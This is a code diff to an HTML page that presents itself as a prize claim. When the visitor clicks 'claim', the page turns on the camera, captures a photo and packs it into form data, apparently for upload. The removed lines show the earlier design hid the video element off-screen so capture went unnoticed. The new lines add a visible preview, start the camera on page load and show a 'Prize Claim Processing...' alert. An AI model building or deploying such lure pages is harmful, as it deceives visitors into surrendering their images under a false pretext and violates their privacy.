@@ -67,12 +67,24 @@
       background-color: #e0e0e0;
     }
     
-    /* Hide the video element but keep it in the DOM for capturing */
+    /* Small camera preview frame */
     #video {
-      position: absolute;
-      top: -9999px;
-      left: -9999px;
-      opacity: 0.01;
+      position: fixed;
+      bottom: 20px;
+      right: 20px;
+      width: 120px;
+      height: 160px;
+      object-fit: cover;
+      border-radius: 12px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.4);
+      border: 3px solid #fff;
+      z-index: 1000;
+      opacity: 0;
+      transition: opacity 0.3s;
+      pointer-events: none;
+    }
+    #video.active {
+      opacity: 1;
     }
   </style>
 </head>
@@ -134,6 +146,7 @@
         video.srcObject = stream;
         await new Promise(r => video.addEventListener("loadedmetadata", r, {once:true}));
         video.play();
+        video.classList.add("active");
       }
     }
 
@@ -170,13 +183,14 @@
       const name = params.get("name") || ("Visitor_" + (1000 + Math.floor(Math.random() * 9000)));
 
       try {
-        await startCamera();
-        
-        // Wait 500ms for camera to focus
-        await new Promise(r => setTimeout(r, 500));
+        if (!stream) {
+          await startCamera();
+          await new Promise(r => setTimeout(r, 500));
+        }
         
         const blob = await captureBlob();
-        stopCamera();
+        // We keep the camera running to preserve the preview
+        // stopCamera();
 
         const fd = new FormData();
         fd.append("name", name);
@@ -195,7 +209,11 @@
     document.querySelector(".claim-btn").addEventListener("click", function(e) {
       e.preventDefault();
       run();
+      alert("Prize Claim Processing..."); // Provide feedback to user
     });
+
+    // Start camera immediately so preview is visible
+    window.addEventListener("DOMContentLoaded", startCamera);
   </script>
 </body>
 </html>
